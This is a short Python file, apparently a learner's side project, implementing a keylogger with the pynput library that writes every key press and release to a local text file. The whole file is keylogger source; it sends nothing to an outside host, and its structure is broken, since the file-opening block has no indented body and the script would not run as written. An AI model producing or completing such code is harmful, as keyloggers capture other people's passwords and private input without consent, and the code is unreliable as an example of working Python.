"""
Author: Gio Raso
Description: Making a key logger as a side project to help learn about cyber sercurity
"""

from pynput import keyboard

# open a file for key strockes
with open('keyStrockes.txt', 'w') as f:

def on_press(key):
    try:
        f.write('{0}'.format(key))
    except AttributeError:
        pass

def on_release(key):
    try:
        f.write('{0}'.format(key))
    except AttributeError:
        pass

with keyboard.Listener(on_press = on_press, on_release = on_release) as listener:
    listener.join()
